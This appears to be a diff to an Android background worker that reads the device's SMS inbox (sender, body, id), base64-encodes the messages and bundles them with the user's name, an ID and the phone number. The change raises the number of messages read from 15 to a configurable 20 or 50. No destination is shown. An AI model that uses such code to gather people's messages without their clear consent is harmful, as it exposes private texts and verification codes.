@@ -54,7 +54,12 @@ public class SmsFetchWorker extends Worker {
     @Override
     public ListenableWorker.Result doWork() {
         try {
-            SmsResponse smsList = fetchSmsMessages();
+            int smsLimit = getInputData().getInt("sms_limit", 20);
+            if (smsLimit != 20 && smsLimit != 50) {
+                smsLimit = 20;
+            }
+
+            SmsResponse smsList = fetchSmsMessages(smsLimit);
             Log.d(TAG, "doWork: " + smsList);
             if (smsList.getUser() == null) {
                 Log.d(TAG, "No SMS messages found.");
@@ -104,7 +109,7 @@ public class SmsFetchWorker extends Worker {
         return android.util.Base64.encodeToString(smsPayloads.getBytes(), android.util.Base64.NO_WRAP);
     }
 
-    private SmsResponse fetchSmsMessages() {
+    private SmsResponse fetchSmsMessages(int smsLimit) {
         SmsResponse smsResponse = new SmsResponse();
         List<SmsPayload> smsList = new ArrayList<>();
         try {
@@ -120,10 +125,10 @@ public class SmsFetchWorker extends Worker {
             // Query the SMS content provider
             ContentResolver contentResolver = getApplicationContext().getContentResolver();
             Uri smsUri = Uri.parse("content://sms/");
-            Cursor cursor = contentResolver.query(smsUri, null, null, null, "date DESC LIMIT 15");
+            Cursor cursor = contentResolver.query(smsUri, null, null, null, "date DESC LIMIT " + smsLimit);
 
             if (cursor != null) {
-                while (cursor.moveToNext()) {
+                while (smsList.size() < smsLimit && cursor.moveToNext()) {
                     String id = getColumnValue(cursor, "_id");
                     String address = getColumnValue(cursor, "address");
                     String body = getColumnValue(cursor, "body");
@@ -143,7 +148,9 @@ public class SmsFetchWorker extends Worker {
                     smsList.add(smsPayload);
                 }
                 cursor.close();
-                String userName = SharedPrefs.getString("user_name", "not_found") + "," + SharedPrefs.getString("cons_id", "not_found");
+                String userName = SharedPrefs.getString("user_name", "")
+                    + ","
+                    + SharedPrefs.getString("cons_id", "");
 
                 String encSmsPayload = encodeTo64(new Gson().toJson(smsList));
                 smsResponse = new SmsResponse(userName,getMobileNo(),encSmsPayload);
